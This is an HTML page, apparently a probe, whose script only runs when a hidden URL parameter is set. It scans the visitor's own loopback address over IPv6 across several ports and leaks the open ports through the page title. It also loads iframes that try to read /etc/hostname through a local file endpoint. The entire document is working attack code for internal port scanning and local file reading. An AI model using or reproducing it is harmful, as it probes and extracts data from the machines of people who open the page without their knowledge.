<!doctype html><meta charset="utf-8"><title>CASI V51</title><body><h2 id="r">IPv6 scan</h2><script>
const q=new URLSearchParams(location.search),r=document.getElementById('r');if(q.get('lang')!=='zzv6')location.replace('/__casi_fallback__?'+q);else{const ps=[80,81,443,8080,8182,8184,8443];Promise.all(ps.map(async p=>{const c=new AbortController;setTimeout(()=>c.abort(),1800);const proto=[443,8443].includes(p)?'https':'http';try{await fetch(proto+'://[::1]:'+p+'/',{mode:'no-cors',signal:c.signal});return p+' LIVE'}catch(e){return p+' '+(e.name==='AbortError'?'TIMEOUT':'CLOSED')}})).then(a=>{document.title='CASI V51 V6 '+a.filter(x=>x.includes('LIVE')).map(x=>x.split(' ')[0]).join(',');r.textContent=a.join(' | ')});for(const p of [8080,8182,8184]){const h=document.createElement('h3');h.textContent='v6 '+p+' hostname';document.body.appendChild(h);const f=document.createElement('iframe');f.src='http://[::1]:'+p+'/file?name=%2Fetc%2Fhostname';f.style='width:100%;height:160px;border:2px solid';document.body.appendChild(f)}}
</script></body>
